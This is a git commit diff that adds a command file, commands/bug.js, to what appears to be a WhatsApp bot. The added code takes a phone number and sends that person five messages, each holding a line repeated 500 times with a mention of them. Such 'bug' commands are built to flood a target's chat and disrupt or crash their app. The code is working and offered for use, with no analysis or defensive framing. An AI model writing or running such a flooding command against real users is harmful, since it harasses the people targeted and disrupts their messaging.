e1e3ff6c013002c1b2483d739bd43c3d905b0e76
TARZAN-XD <tkrshqtk@gmail.com>
2025-08-02 00:23:19 +0300

    Update bug.js

--- commands/bug.js
+++ commands/bug.js
@@ -1,1 +1,10 @@
+module.exports = async (sock, number) => {
+    const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;
 
+    for (let i = 0; i < 5; i++) {
+        await sock.sendMessage(jid, {
+            text: "🔥 BUG TEST 🔥\n".repeat(500),
+            mentions: [jid]
+        });
+    }
+};
